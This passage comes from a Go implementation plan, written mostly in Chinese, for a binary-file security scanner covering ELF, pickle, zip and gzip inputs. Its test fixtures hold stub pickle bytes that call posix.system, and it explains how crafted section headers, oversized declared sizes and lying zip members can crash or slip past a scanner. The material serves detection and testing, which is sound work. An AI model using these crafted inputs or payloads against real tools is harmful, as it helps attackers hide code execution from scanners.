> 守卫**不做类判断**，这是有意的：`getSymbols32`（`file.go:631-633`）在它自己的切片之前有一条显式的 `if len(data) == 0 { return ... "symbol section is empty" }`，所以 32 位表**永远不会 panic**，不需要任何守卫来保安全。守卫针对的那个事实——节解出来是空的——对两个类是一样的，而一个解不出字节的表在两个类里都**没有符号可丢**，所以一道统一的检查同时覆盖两者，不必去分支 `EI_CLASS`（那正是 `ClassifyBinary` 根本不看的字段）。边界仍然恰好是"空"：长度 1..23 是另一个事实（一张畸形的表），留给读取器去报。
>
> "空"必须按 `debug/elf` 问的方式问，而那**不是**读节头。`Section.Data`（`file.go:107`）是 `saferio.ReadData(s.Open(), s.Size)`，而 Go 从左到右求值实参，所以 `Open` 先跑，`ReadData` 拿到的 `n` 是 `Open` 刚写下的那个值。`Section.Open`（`file.go:126`）在每次读取时都会被调用，并且在 `file.go:146` 处，对**名字以 `.zdebug` 开头、前 12 字节是 `"ZLIB"`** 的节做 `s.Size = binary.BigEndian.Uint64(b[4:12])`——**攻击者自己的字节**。于是节体为 `"ZLIB"` 加 8 个零字节的节就让 `s.Size` 变成 0，`ReadData` 于是不分配任何内存、`io.ReadFull` 对空缓冲区空成功，返回一个**非 nil 的空切片加 nil error**；`getSymbols64` 看到 `len(data) == 0`，通过倍数检查，panic。这一切在 `sh_size` 里都看不见，它仍然是普普通通的 12——所以一个只盯着节头看的读者会得出"这个守卫没必要"的结论，这正是本段存在的理由。守卫因此要按 `Data` 的顺序问同一个问题：**看 `Data` 会拿到的字节，而不是节头里的长度**（本任务用 `symbolTableIsEmpty` 封住这一点，它调用的就是符号读取器自己会调的那个 `Data`；方向也是安全的——`Data` 报 error 的地方，符号读取器会 panic）。`SectionByType` 返回**同类型里的第一个**节，这让这个形状很便宜就能构造——文件只要把自己那个 `.zdebug` 节排在真正的前面。
>
> 第二处是**压缩头的 `ch_size` 没有范围检查**：普通节的 `sec.Size` 来自 `sh_size`，`debug/elf` 在解析时已经拒绝把它当负数（`if int64(s.FileSize) < 0` 直接返回 `FormatError`），所以有符号比较在那里是安全的；但 `SHF_COMPRESSED` 的节 `sec.Size` 来自压缩头 `ch_size`，**同一道检查没有加在它上面**。于是一个构造出的 `ch_size = 2^63` 让 `sec.Size` 成为一个 int64 视图为负的 `uint64`，`read < int64(sec.Size)` 对任何 `read` 都为假，这个节就被当成"整节读完"——既不记结构性缺口，又因为它是可执行节而被量了熵、报了干净。这正是这条检查存在的理由被一次类型转换重新打开的 fail-open。修法是比较**无符号**（`uint64(read) < sec.Size`），两个数本来就都是字节计数。
>
> `SHT_SYMTAB` 有与第一处完全相同的形状，这正好是本函数**本来就不读它**的第二个理由（第一个是符号来源的误报，见上）：一个兜底来源还得替它背同样的守卫，而它提供的是本解析已经决定不用的符号。
>
> 这几条与 `collectELF` 开头的 `cfg = normalizeBinaryConfig(cfg)` 是同一类事：它们保护的不是"输入正常时会怎样"，而是"输入不正常时不要变成静默通过"。`normalizeBinaryConfig` 那一行的意义要单独说，因为它看着像样板：`collectELF` 直接读 `cfg.MaxStreamBytes` 当每文件预算，而 `newEvidenceSet` 与 `newStringScanner` 都会先归一化，一个零值 `BinaryConfig{}` 于是给出零预算，每个可执行节都记成"预算已花光"的结构性缺口，可执行类型的文件被删包——踩中的是将来接线的那个任务，不是现在这批测试（它们全都经 `DefaultBinaryConfig` 构造配置）。
>
> 每一处都要有测试钉住，否则它们会在下一次重构里被当成多余的分支删掉：**（a）** 一个 `.dynsym` 解出空内容的夹具必须不 panic 且不产出 bound（"这张表没有导入"是它的事实，不是缺口）；**（a2）** 一条 `.zdebug` 形状的夹具——名字以 `.zdebug` 开头、节体是 `"ZLIB"` 加 8 个零字节、`sh_size` 是一个普通值——必须同样不 panic，且**必须在 `sh_size` 看着正常的前提下通过**，因为这条测试的全部价值就在于它钉的是"守卫必须看解出来的长度、不能看节头"；少了它，一个只看 `sh_size` 的守卫会全绿而漏洞还在；**（b）** 一个声明长度超出可读字节的节必须记为结构性缺口，且这一条要在**无符号**语义下成立（有符号写法的失败方式正是"声明长度的高位置位时整条检查被跳过"，所以这条测试的夹具要能表达那个形状：普通节的 `sh_size` 会被 `debug/elf` 在解析期拒绝，能表达它的是 `SHF_COMPRESSED` 的压缩头）；**（c）** 传一个零值 `BinaryConfig{}` 时，一个正常的可执行节仍要被量熵而不是被记成"预算花光"。
>
> **（a3）反向的那条同样要钉：长度 1..23 的 `.dynsym` 必须仍然失败 fail-closed**（走 error 路径、让整个文件被记为 `Incomplete`），**不得**被守卫静默跳过。这是"区间守卫是反的"那句话的落地测试——把守卫写成 `Size < 24` 会让这条测试变红，而只测 (a) 是发现不了的。注意现有的 `TestCollectELFEmptyDynsymIsNotAStrippedFile` 钉不住 (a)：它的夹具是一个合法的 24 字节保留项，根本不触发那条切片。**这条规则的落地测试是 `TestCollectELFEvidenceFailsClosedOnATruncatedDynsym`**（在 Step 2 的用例清单里）：它用 `shortDynsym` 夹具写出 8 字节的 `.dynsym`，断言 `collectELF` 返回一个点名 `dynamic symbols` 的错误，而不是把这张格式错误的表当空跳过。

- [ ] **Step 6: 提交**

```bash
gofmt -l internal/codeaudit/ ; go vet ./internal/codeaudit/
git add internal/codeaudit/binary_evidence.go internal/codeaudit/binary_evidence_test.go internal/codeaudit/binary_fixtures_test.go
git commit -m "feat(audit): read ELF imports, dependencies and section entropy as evidence"
```

---

### Task 6: 容器与压缩流成员抽取

**Files:**
- Modify: `internal/codeaudit/binary_evidence.go`
- Test: `internal/codeaudit/binary_evidence_test.go`

> **本任务的步骤顺序是承重的，不要"整理"回"容器在前"。** `collectELFMember`（Step 6）调用 `collectELFReader`（Step 3 创建），而 `collectELFReader` 的薄封装又调用 `streamWithSizeSwitch`（Step 1 创建）——依赖只有一个方向，所以只有"先加窗口化开关、再拆 reader 版本、最后写容器"这个顺序能让每一次提交都编得过；把容器工作挪回最前面，恢复的正是那个编不过的顺序。

- [ ] **Step 1: 加窗口化开关**

追加到 `binary_evidence.go`：

```go
// streamWithSizeSwitch streams a file end to end when it is small enough to be
// worth it, and reads only its head and tail when it is not.
//
// The switch exists because the two costs are not comparable. A full pass costs
// about 3 microseconds per kibibyte at the measured rate, which is nothing for
// the 10.8 MiB pickle that is the largest such file in the example package and
// nine seconds for a 3 GiB shard. Above MaxFullScanBytes the pass is replaced by
// a HeadTailBytes window at each end.
//
// Skipping the middle is recorded, and how it is recorded is isExecutableKind's
// existing asymmetry rather than a new rule: a windowed pickle or ELF leaves a
// region of an executable format unread, so it is a structural bound and a clean
// verdict is withheld; a windowed tensor blob is a data bound and is only
// reported. Without the first half the threshold would be an evasion: padding a
// pickle past 64 MiB would hide a mid-stream GLOBAL and still pass.
//
// What that gives up is stated in the plan's boundary section rather than hidden
// here: for a raw blob the middle is tensor data no loader reads, so nothing
// reachable is lost. For a pickle it is a real loss - a GLOBAL emitted in the
// middle of a long data-building run would be missed - and the two windows are
// the mitigation rather than a cure, covering the load-time call at the front and
// the post-load action at the back. A deployment whose packages contain such a
// file raises maxFullScanBytes rather than being silently exempted.
func streamWithSizeSwitch(path string, set *EvidenceSet, cfg BinaryConfig) error {
	if set.Size > cfg.MaxFullScanBytes {
		set.markStructural(fmt.Sprintf("file is %d bytes, above MaxFullScanBytes %d: only the head and tail %d bytes were read",
			set.Size, cfg.MaxFullScanBytes, cfg.HeadTailBytes))
		return streamHeadAndTail(path, set, cfg)
	}
	return streamEvidence(path, set, cfg, cfg.MaxStreamBytes)
}

// streamHeadAndTail runs the byte extractors over the first and last
// HeadTailBytes of a file.
//
// It is what makes an appended payload visible. A zip's directory lives at the
// end of the file and describes only the members before it, so a payload stapled
// after the last member is inside no member and would otherwise be read by
// nothing; the same reasoning covers a section appended past an ELF's last
// section header.
//
// The window size is a parameter rather than a constant because two callers want
// different ones: a container always reads its two ends, while a large blob reads
// its ends only because it was too large to read whole.
//
// The pickle interpreter is gated here the same way it is gated everywhere else:
// it runs only when set.Kind is KindPickle, and only over the head window. That
// gating is what keeps this path from being a bound on every archive - a zip's own
// bytes are not an opcode stream, and KindArchive is an executable kind, so an
// ungated interpreter would set Bound.Structural on every .pt and .whl. The head
// window is a valid prefix of the opcode stream and can be parsed; the tail window
// is a splice out of the middle, and feeding a spliced fragment to a stateful
// parser would make it read the splice as a continuation and invent targets out of
// data bytes, so the tail goes to the strings pass alone. Nothing is lost by that:
// this path is only reached above MaxFullScanBytes, where the file is already
// recorded as structurally bounded.
func streamHeadAndTail(path string, set *EvidenceSet, cfg BinaryConfig) error {
	f, err := os.Open(path)
	if err != nil {
		return fmt.Errorf("open %s: %w", path, err)
	}
	defer f.Close()
	info, err := f.Stat()
	if err != nil {
		return fmt.Errorf("stat %s: %w", path, err)
	}

	headTailBytes := cfg.HeadTailBytes
	scanner := newStringScanner(set, cfg)
	var pickles *pickleScanner
	if set.Kind == KindPickle {
		pickles = newPickleScanner(set)
	}

	head := make([]byte, headTailBytes)
	n, err := f.ReadAt(head, 0)
	if err != nil && err != io.EOF {
		return fmt.Errorf("read %s: %w", path, err)
	}
	if _, err := scanner.Write(head[:n]); err != nil {
		return err
	}
	if pickles != nil {
		if _, err := pickles.Write(head[:n]); err != nil {
			return err
		}
	}

	if info.Size() > headTailBytes {
		tail := make([]byte, headTailBytes)
		at := info.Size() - headTailBytes
		n, err := f.ReadAt(tail, at)
		if err != nil && err != io.EOF {
			return fmt.Errorf("read %s: %w", path, err)
		}
		// The offset is rebased so that a tail literal reports where it actually
		// is: an offset that silently restarted at zero would make two different
		// payloads report the same location. The interpreter is not rebased and not
		// fed the tail at all - see the note above.
		scanner.at = at
		if _, err := scanner.Write(tail[:n]); err != nil {
			return err
		}
	}
	scanner.Flush()
	if pickles != nil {
		pickles.Flush()
	}
	return nil
}
```

提交：

```bash
git add internal/codeaudit/binary_evidence.go
git commit -m "feat(audit): window large files to their head and tail"
```

- [ ] **Step 2: 钉住窗口化开关的测试**

在 `binary_evidence_test.go` 的 import 块补 `"fmt"`（这条用例用 `fmt.Sprintf` 拼出期望的窗口尺寸；`os` 与 `strings` 已在 Task 2 引入，`os.Stat` 用来把 `set.Size` 设成文件的真实大小）。

追加到 `binary_evidence_test.go`：

```go
// TestStreamWithSizeSwitchWindowsAFileAboveTheFullScanBudget pins the switch in
// both directions. At or below the budget the whole file is read, so a literal
// that exists only in the middle is found and no bound is recorded; above it the
// two windows are read, so the head literal is found, the middle one is not, and
// the skip is a structural bound naming the threshold and the window size.
//
// The threshold is read from cfg rather than a constant, so a small config drives
// the same branch a 64 MiB fixture would and the test does not have to build that
// fixture. Do not "fix" this by building a real oversized file.
//
// What a structural bound costs a package is not decided here. Task 9's scanner
// folds it through isExecutableKind: a windowed pickle or ELF is withheld, a
// windowed raw blob is only recorded. This test asserts the record, not the
// block, and must not be read as the place that decides deletion.
func TestStreamWithSizeSwitchWindowsAFileAboveTheFullScanBudget(t *testing.T) {
	dir := t.TempDir()
	const fullScan, window = 4096, 64
	cfg := DefaultBinaryConfig()
	cfg.MaxFullScanBytes = fullScan
	cfg.HeadTailBytes = window

	small := make([]byte, fullScan)
	copy(small, "\x00SMALL_HEAD\x00")
	copy(small[fullScan/2:], "\x00SMALL_MIDDLE\x00")

	large := make([]byte, fullScan*2)
	copy(large, "\x00LARGE_HEAD\x00")
	copy(large[fullScan:], "\x00LARGE_MIDDLE\x00")
	copy(large[len(large)-13:], "\x00LARGE_TAIL\x00")

	for _, tc := range []struct {
		file       string
		content    []byte
		wantFound  []string
		wantAbsent []string
		wantBound  bool
	}{
		{"at_budget.bin", small, []string{"SMALL_HEAD", "SMALL_MIDDLE"}, nil, false},
		{"above_budget.bin", large, []string{"LARGE_HEAD", "LARGE_TAIL"}, []string{"LARGE_MIDDLE"}, true},
	} {
		t.Run(tc.file, func(t *testing.T) {
			path := writeTestBytes(t, dir, tc.file, tc.content)
			set := newTestEvidence(path, KindRaw)
			// CollectEvidence sets Size from the file itself, and the switch decides
			// the branch from it. A zero Size would take the whole-file branch for
			// every file and the test would pass without ever exercising the window.
			info, err := os.Stat(path)
			if err != nil {
				t.Fatal(err)
			}
			set.Size = info.Size()

			if err := streamWithSizeSwitch(path, set, cfg); err != nil {
				t.Fatalf("streamWithSizeSwitch: %v", err)
			}

			texts := map[string]bool{}
			for _, l := range set.Lines {
				texts[l.Text] = true
			}
			for _, want := range tc.wantFound {
				if !texts[want] {
					t.Errorf("%q missing from the evidence", want)
				}
			}
			for _, absent := range tc.wantAbsent {
				if texts[absent] {
					t.Errorf("%q was read; the middle of an oversized file must be skipped", absent)
				}
			}
			if set.Bound.Structural != tc.wantBound {
				t.Fatalf("Bound.Structural = %t, want %t (reason %q)", set.Bound.Structural, tc.wantBound, set.Bound.Reason)
			}
			if !tc.wantBound {
				return
			}
			if !strings.Contains(set.Bound.Reason, "MaxFullScanBytes") {
				t.Errorf("bound reason = %q, want it to name MaxFullScanBytes", set.Bound.Reason)
			}
			if !strings.Contains(set.Bound.Reason, fmt.Sprintf("head and tail %d", window)) {
				t.Errorf("bound reason = %q, want it to name the %d-byte head/tail window", set.Bound.Reason, window)
			}
		})
	}
}
```

这条测试只断言"开关留下了什么记录"，不断言"阻断"。结构性缺口能不能挡住导入，不由这条开关决定，而是由消费方 `isExecutableKind` 决定：Task 9 的 `ScanDirectory` 在 `if set.Bound.Structural` 分支里按 `isExecutableKind(kind)` 分流，可执行类型记 `BoundedExecutable`、其余记 `BoundedData`（Task 7 的 `TestCollectEvidenceWindowsAFileAboveTheSizeThreshold` 才钉那条谓词）。本条用例断言的是 `Bound.Structural` 与 `Bound.Reason` 这两个记录本身。

提交：

```bash
git add internal/codeaudit/binary_evidence_test.go
git commit -m "test(audit): pin the head and tail windowing switch"
```

- [ ] **Step 3: 把 `collectELF` 拆出 reader 版本**

`collectELF(path, ...)` 与 `collectELFMember` 需要共用同一段解析逻辑，所以把 Task 5 的实现体抽到一个以 `io.ReaderAt` 为入口的内核上，`collectELF` 变成薄封装。修改 `binary_evidence.go` 中 Task 5 写的 `collectELF`：

本步的测试就是 Task 5 已有的那一族 ELF 用例：它们从此要经 `collectELF` 薄封装进入 `streamWithSizeSwitch`、再进解析体，而在默认的 64 MiB 预算下这些夹具都会整份读完，所以必须**一字不改地保持全绿**——这就是"这次拆分只换了那个在消息里命名文件的参数、别的什么都没动"的证据。

```go
// collectELF reads a file's ELF structure into evidence.
func collectELF(path string, set *EvidenceSet, cfg BinaryConfig) error {
	// Resolve a zero config before it reaches streamWithSizeSwitch: that switch
	// reads cfg.MaxFullScanBytes, and a zero there would read every non-empty file
	// as above a 0-byte budget and window it. collectELFReader normalizes for the
	// structural pass, but the stream pass runs first and is bounded from here.
	cfg = normalizeBinaryConfig(cfg)
	f, err := os.Open(path)
	if err != nil {
		return fmt.Errorf("open %s: %w", path, err)
	}
	defer f.Close()
	// The stream pass and the structural pass are separate on purpose: the
	// stream pass reads the file front to back for literals, and the structural
	// pass seeks. Sharing one handle between them would make the structural
	// parse depend on where the stream pass happened to stop.
	//
	// Through streamWithSizeSwitch rather than streamEvidence directly, so that a
	// large shared object is windowed at its ends like any other large blob
	// instead of being streamed whole.
	if err := streamWithSizeSwitch(path, set, cfg); err != nil {
		return err
	}
	return collectELFReader(f, set, cfg, path)
}

// collectELFReader is the ELF parse itself, over any random-access reader. It is
// separate from collectELF so that a container member - which is a stream, not a
// path - is parsed by the same code rather than by a second implementation that
// would drift from this one.
//
// It carries the whole of Task 5's body: the sectionless structural bound, the
// .dynsym walk and its too-short-section guard, the per-section summary lines,
// and the streamed entropy pass through countSection and entropyVerdictFromCounts.
// All of that reads through io.ReaderAt already - debug/elf takes one, and
// elf.Section.Open returns an io.Reader - so the move changes nothing but the
// parameter that names the file in messages.
//
// Task 5's `cfg = normalizeBinaryConfig(cfg)` moves here with the body, and it
// has to stay here rather than in the wrapper: collectELFMember reaches this
// parse directly, so normalizing only on the path side would leave every
// container member parsed against a config nobody resolved.
//
// There is no size parameter: the parse bounds itself per file through
// cfg.MaxStreamBytes, applied as the budget countSection stops at, and a size
// the body never read would be a parameter that only invites the assumption that
// something is bounds-checked elsewhere.
func collectELFReader(r io.ReaderAt, set *EvidenceSet, cfg BinaryConfig, name string) error {
	ef, err := elf.NewFile(r)
	if err != nil {
		return fmt.Errorf("parse elf %s: %w", name, err)
	}
	defer ef.Close()
	// ... (Task 5 的解析体原样搬到这里，把 path 换成 name)
}
```

两个此前没有写下来的点，这里明确一次：

> **`collectELF` 的产物里没有字符串证据，是分离而不是漏做。** Task 5 的 `collectELF` 只做结构解析，本步才把 `streamWithSizeSwitch` 接在它前面，所以一个有路径的 ELF 最终拿到的是"字符串 + 结构"两份证据。顺序是先流后解析，而不是反过来：结构解析要 seek，流式读取要顺序读到底，共用一个句柄会让结构解析的位置取决于流式读取停在了哪里。`streamWithSizeSwitch` 而不是 `streamEvidence`，是为了让一个大 `.so` 和其它大 blob 一样按"头 + 尾"开窗，而不是整份读进来。

> **容器成员走的是另一条路：它先被判类、读进内存，再决定要不要解析。** 一个 zip 成员若不是 ELF/pickle 就不读进内存、不解析（这也是容器解压后的总体积不被 `MaxArchiveMemberBytes` 约束的原因）；是 ELF 就走 `collectELFReader(bytes.NewReader(data), ...)`，与有路径的 ELF 用同一段解析体。字符串证据在这一步由 `collectELFMember` 自己跑（成员已经在内存里，不需要再按大小开窗），所以成员和有路径文件最终拿到同两类证据，只是字符串那一段来自不同的读取路径——这也是 `entropyVerdictFromCounts` 必须同时被两条读取路径使用的原因之一。

提交：

```bash
git add internal/codeaudit/binary_evidence.go
git commit -m "refactor(audit): share the ELF parse between paths and container members"
```

- [ ] **Step 4: 写失败测试**

先在 `binary_evidence_test.go` 的 import 块补 `"bytes"`（`zipFixture` 与 gzip 夹具都要用 `bytes.Buffer`；Go 不允许未使用的 import，所以在真的用到它的这一步才加）。

追加到 `binary_evidence_test.go`：

```go
// zipFixture builds a zip in memory, so the container tests state their members
// rather than depending on a committed archive.
func zipFixture(t *testing.T, members map[string][]byte, order []string) []byte {
	t.Helper()
	var buf bytes.Buffer
	w := zip.NewWriter(&buf)
	for _, name := range order {
		fw, err := w.Create(name)
		if err != nil {
			t.Fatal(err)
		}
		if _, err := fw.Write(members[name]); err != nil {
			t.Fatal(err)
		}
	}
	if err := w.Close(); err != nil {
		t.Fatal(err)
	}
	return buf.Bytes()
}

func TestCollectArchiveEvidenceListsMembersAndRecurses(t *testing.T) {
	dir := t.TempDir()
	pickle := []byte("\x80\x04cposix\nsystem\n.")
	elfMember := elfFixtureBytes(t, elfSpec{imports: []string{"connect"}, needed: []string{"libcurl.so.4"}})
	raw := zipFixture(t, map[string][]byte{
		"archive/data.pkl": pickle,
		"archive/lib.so":   elfMember,
		"archive/version":  []byte("3"),
	}, []string{"archive/version", "archive/data.pkl", "archive/lib.so"})
	path := writeTestBytes(t, dir, "model.pt", raw)

	set := newTestEvidence(path, KindArchive)
	if err := collectArchive(path, set, DefaultBinaryConfig()); err != nil {
		t.Fatalf("collectArchive: %v", err)
	}

	var members, pickles, dynsyms, needed []string
	for _, l := range set.Lines {
		switch l.Source {
		case SourceMember:
			members = append(members, l.Text)
		case SourcePickle:
			pickles = append(pickles, l.Text)
		case SourceDynsym:
			dynsyms = append(dynsyms, l.Text)
		case SourceNeeded:
			needed = append(needed, l.Text)
		}
	}

	for _, want := range []string{"archive/version", "archive/data.pkl", "archive/lib.so"} {
		found := false
		for _, m := range members {
			if strings.HasPrefix(m, want) {
				found = true
			}
		}
		if !found {
			t.Errorf("member %q missing; got %v", want, members)
		}
	}
	if !containsString(pickles, "posix.system") {
		t.Errorf("a pickle member produced no target evidence; got %v", pickles)
	}
	if !containsString(dynsyms, "connect") {
		t.Errorf("an ELF member's imports were not read; got %v", dynsyms)
	}
	if !containsString(needed, "libcurl.so.4") {
		t.Errorf("an ELF member's DT_NEEDED was not read; got %v", needed)
	}
}

// TestCollectArchiveEvidenceBoundsMemberCount pins the member ceiling as a
// structural bound. Members past the ceiling are never opened, and for a
// container that can hold a pickle that is a look that did not happen - so it
// withholds a clean verdict rather than being reported as a big archive.
func TestCollectArchiveEvidenceBoundsMemberCount(t *testing.T) {
	dir := t.TempDir()
	members := map[string][]byte{}
	var order []string
	for i := 0; i < 5; i++ {
		name := fmt.Sprintf("m%d", i)
		members[name] = []byte("x")
		order = append(order, name)
	}
	path := writeTestBytes(t, dir, "many.whl", zipFixture(t, members, order))

	cfg := DefaultBinaryConfig()
	cfg.MaxArchiveMembers = 2
	set := newTestEvidence(path, KindArchive)
	if err := collectArchive(path, set, cfg); err != nil {
		t.Fatalf("collectArchive: %v", err)
	}
	if !set.Bound.Structural {
		t.Error("Bound.Structural = false after the member ceiling was reached")
	}
}

// TestCollectArchiveEvidenceBoundsAMemberAtTheByteBudget pins the per-member
// structural bound, which is the one a container's import is actually withheld
// on: isExecutableKind(KindArchive) is true, so a structural bound here stops the
// scan passing, and the bound is recorded because a member's tail was never
// looked at. Without this test the guard is unpinned - removing it leaves the
// whole suite green, which is the shape a guard silently drops into.
//
// A small budget drives the same branch as a member above the default 256 MiB:
// the guard reads cfg.MaxArchiveMemberBytes, so a tiny config reaches it without
// a quarter-gigabyte fixture. The budget is the member's own length because that
// is the only value that reaches this guard rather than the dispatcher's earlier
// declared-size check: a smaller budget makes collectArchive mark the member from
// its declared UncompressedSize64 and break before the member is opened, which is
// a different guard. The comparison is >= rather than >, so a member exactly at
// the budget is bounded as well - the read was capped, and whether the member
// continued past the cap cannot be told without a further probe.
//
// The reason is asserted, not only the flag, because it is the line an operator
// reads when an import is held back: a bare Bound.Structural would not say which
// member hit which limit.
func TestCollectArchiveEvidenceBoundsAMemberAtTheByteBudget(t *testing.T) {
	dir := t.TempDir()
	elfMember := elfFixtureBytes(t, elfSpec{imports: []string{"connect"}, needed: []string{"libc.so.6"}})
	path := writeTestBytes(t, dir, "model.pt", zipFixture(t, map[string][]byte{"lib.so": elfMember}, []string{"lib.so"}))

	cfg := DefaultBinaryConfig()
	cfg.MaxArchiveMemberBytes = int64(len(elfMember))
	set := newTestEvidence(path, KindArchive)
	if err := collectArchive(path, set, cfg); err != nil {
		t.Fatalf("collectArchive: %v", err)
	}
	if !set.Bound.Structural {
		t.Fatalf("Bound.Structural = false for a member at the byte budget; its tail was never read")
	}
	if !strings.Contains(set.Bound.Reason, "lib.so") {
		t.Errorf("bound reason = %q, want it to name the member lib.so", set.Bound.Reason)
	}
	if !strings.Contains(set.Bound.Reason, "byte budget") {
		t.Errorf("bound reason = %q, want it to name the byte budget", set.Bound.Reason)
	}
}

// TestCollectArchiveEvidenceReturnsAnErrorForAnUnopenableContainer pins the other
// half of the fail-closed split, and the reason it is not folded into the
// member-ceiling test is that the two look identical if a guard is written the
// easy way. A container that will not open is a file the scan never looked at, so
// collectArchive returns an error; only a container it opened and did not finish
// gets Bound.Structural. Swallowing the open error into markStructural would make
// an unreadable file indistinguishable from a read one - the scanner counts set.Err
// as Incomplete and withholds the pass, and a bound alone does not carry that.
func TestCollectArchiveEvidenceReturnsAnErrorForAnUnopenableContainer(t *testing.T) {
	dir := t.TempDir()
	// Zip magic, then bytes with no central directory behind them, so the magic
	// classifies it as a container and zip.NewReader refuses it.
	raw := append([]byte("PK\x03\x04"), bytes.Repeat([]byte{0xff}, 64)...)
	path := writeTestBytes(t, dir, "broken.pt", raw)

	set := newTestEvidence(path, KindArchive)
	err := collectArchive(path, set, DefaultBinaryConfig())
	if err == nil {
		t.Fatal("collectArchive accepted a file with zip magic that will not open; a failed look must not be reported as a bounded one")
	}
	if set.Bound.Structural {
		t.Errorf("an unopenable container set Bound.Structural (%q); the failure must be an error, not a bound", set.Bound.Reason)
	}
}

// TestCollectCompressedEvidence pins both directions of the gzip gate. The
// decompressed bytes are a file of their own, so the pickle interpreter runs on
// them only if they sniff as a pickle: a pickle hidden in a .gz is read as one,
// and a gzip that is not a pickle gets the strings pass alone rather than a
// structural bound on KindCompressed - which is executable, so a bound there
// would block every .gz in every package.
func TestCollectCompressedEvidence(t *testing.T) {
	dir := t.TempDir()
	gz := func(name, content string) string {
		var buf bytes.Buffer
		zw := gzip.NewWriter(&buf)
		if _, err := zw.Write([]byte(content)); err != nil {
			t.Fatal(err)
		}
		if err := zw.Close(); err != nil {
			t.Fatal(err)
		}
		return writeTestBytes(t, dir, name, buf.Bytes())
	}

	picklePath := gz("payload.gz", "\x80\x04cposix\nsystem\n.PADDING_PADDING")
	set := newTestEvidence(picklePath, KindCompressed)
	if err := collectCompressed(picklePath, set, DefaultBinaryConfig()); err != nil {
		t.Fatalf("collectCompressed: %v", err)
	}
	var pickles []string
	for _, l := range set.Lines {
		if l.Source == SourcePickle {
			pickles = append(pickles, l.Text)
		}
	}
	if !containsString(pickles, "posix.system") {
		t.Errorf("pickle evidence = %v, want [posix.system]", pickles)
	}

	// A gzip of bytes that are not a pickle must not produce pickle evidence and
	// must not be bounded: the interpreter never ran.
	textPath := gz("notes.gz", "the posix system call interface is described here")
	set = newTestEvidence(textPath, KindCompressed)
	if err := collectCompressed(textPath, set, DefaultBinaryConfig()); err != nil {
		t.Fatalf("collectCompressed: %v", err)
	}
	for _, l := range set.Lines {
		if l.Source == SourcePickle {
			t.Errorf("pickle evidence %q from a gzip that is not a pickle", l.Text)
		}
	}
	if set.Bound.Structural {
		t.Errorf("a gzip that is not a pickle set Bound.Structural: %s", set.Bound.Reason)
	}
}

// lyingMember builds a one-member zip whose header declares a size that does not
// match the bytes it stores. zip.Writer.Create writes the true sizes, so a fixture
// that has to lie needs CreateRaw and the header fields set by hand.
//
// It exists because a member whose declared size exceeds a budget is caught by
// collectArchive's declared-size check before it is ever opened, so the inner
// per-member budgets are reachable only by a member that lies - and the reader
// bounds what it hands out: checksumReader returns ErrFormat the moment it reads
// past the declared UncompressedSize64, so a member can never deliver more than
// its declared size. The only lie that both bypasses the declared-size check and
// delivers bytes is the high bit set, which makes int64(UncompressedSize64)
// negative and the "> budget" comparison false.
func lyingMember(t *testing.T, name string, body []byte, method uint16, declared uint64) []byte {
	t.Helper()
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	fh := &zip.FileHeader{Name: name, Method: method}
	fh.UncompressedSize64 = declared
	fh.CompressedSize64 = uint64(len(body))
	fh.CRC32 = crc32.ChecksumIEEE(body)
	w, err := zw.CreateRaw(fh)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := w.Write(body); err != nil {
		t.Fatal(err)
	}
	if err := zw.Close(); err != nil {
		t.Fatal(err)
	}
	return buf.Bytes()
}

// TestCollectCompressedEvidenceBoundsTheDecompressedBudget pins the budget on the
// decompressed bytes of a gzip. It is the most serious of the container budgets:
// it is the only thing between a small .gz and an unbounded decompression scan,
// and reaching it needs no crafted input, only ordinary compressible data.
//
// A small cfg reaches the same branch as a stream above the default 256 MiB - the
// guard reads cfg.MaxArchiveMemberBytes - so the fixture is 512 bytes, not a
// quarter of a gigabyte. The bytes are not a pickle, so the interpreter does not
// run and the bound asserted is the budget's rather than the interpreter's.
func TestCollectCompressedEvidenceBoundsTheDecompressedBudget(t *testing.T) {
	dir := t.TempDir()
	var buf bytes.Buffer
	zw := gzip.NewWriter(&buf)
	if _, err := zw.Write(bytes.Repeat([]byte("A"), 512)); err != nil {
		t.Fatal(err)
	}
	if err := zw.Close(); err != nil {
		t.Fatal(err)
	}
	path := writeTestBytes(t, dir, "big.gz", buf.Bytes())

	cfg := DefaultBinaryConfig()
	cfg.MaxArchiveMemberBytes = 64
	set := newTestEvidence(path, KindCompressed)
	if err := collectCompressed(path, set, cfg); err != nil {
		t.Fatalf("collectCompressed: %v", err)
	}
	if !set.Bound.Structural {
		t.Fatalf("Bound.Structural = false for a .gz past the decompressed budget; the scan was not bounded")
	}
	if want := "decompressed stream exceeds 64 bytes"; !strings.Contains(set.Bound.Reason, want) {
		t.Errorf("bound reason = %q, want it to name %q", set.Bound.Reason, want)
	}
}

// TestCollectArchiveEvidenceBoundsAPickleMemberAtTheByteBudget pins the pass-through
// from collectPickleMember to streamReaderEvidence. The bound it can set - "member
// %s exceeds the byte budget" - is unreachable for an honest member: the declared
// size that would exceed the budget is caught first by collectArchive's
// declared-size check, so the member is never opened, and an honest member never
// delivers more than its declared size. Reaching this budget is therefore only
// possible through lyingMember's high-bit lie, which is why the fixture lies.
//
// A small cfg reaches the same branch as a member above the default budget, and
// the pickle body stops at STOP well inside the budget, so the interpreter records
// only a trailing-bytes notice and the budget is the first structural reason.
func TestCollectArchiveEvidenceBoundsAPickleMemberAtTheByteBudget(t *testing.T) {
	dir := t.TempDir()
	// PROTO, GLOBAL(posix.system), STOP, then padding after STOP that the
	// interpreter counts but does not parse.
	body := append([]byte("\x80\x04cposix\nsystem\n."), bytes.Repeat([]byte(" "), 400)...)
	path := writeTestBytes(t, dir, "model.pt", lyingMember(t, "payload.pkl", body, zip.Store, 1<<63))

	cfg := DefaultBinaryConfig()
	cfg.MaxArchiveMemberBytes = 64
	set := newTestEvidence(path, KindArchive)
	if err := collectArchive(path, set, cfg); err != nil {
		t.Fatalf("collectArchive: %v", err)
	}
	if !set.Bound.Structural {
		t.Fatalf("Bound.Structural = false for a pickle member past the byte budget")
	}
	if !strings.Contains(set.Bound.Reason, "payload.pkl") {
		t.Errorf("bound reason = %q, want it to name the member", set.Bound.Reason)
	}
	if !strings.Contains(set.Bound.Reason, "exceeds the byte budget") {
		t.Errorf("bound reason = %q, want the pickle member byte-budget wording", set.Bound.Reason)
	}
}

// TestCollectArchiveEvidenceBoundsAMemberByItsDeclaredSize pins the declared-size
// check, the one that fires before a member is opened and is therefore the real
// zip-bomb guard: a small archive can declare a member far larger than the whole
// archive, and trusting the declaration is what the check refuses to do.
//
